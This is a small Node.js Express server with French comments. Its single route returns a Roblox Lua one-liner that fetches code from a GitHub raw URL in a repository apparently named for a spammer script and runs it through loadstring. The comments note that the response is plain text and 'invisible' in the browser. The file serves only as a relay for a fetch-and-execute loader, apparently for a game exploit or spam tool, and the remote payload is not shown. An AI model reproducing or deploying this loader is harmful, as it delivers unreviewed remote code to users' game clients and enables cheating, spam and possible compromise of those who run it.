const express = require("express");
const app = express();
const port = process.env.PORT || 3000;

// Le script Lua à renvoyer au client (Roblox)
const luaScript = `loadstring(game:HttpGet("https://raw.githubusercontent.com/plantapi662-lab/APSPAMMERSAB/refs/heads/main/W"))()`;

app.get("/", (req, res) => {
  // On envoie juste le code Lua en tant que réponse brute (invisible dans le navigateur)
  res.type("text/plain");  // Indique que la réponse est du texte brut
  res.send(luaScript);     // Envoie le script Lua
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
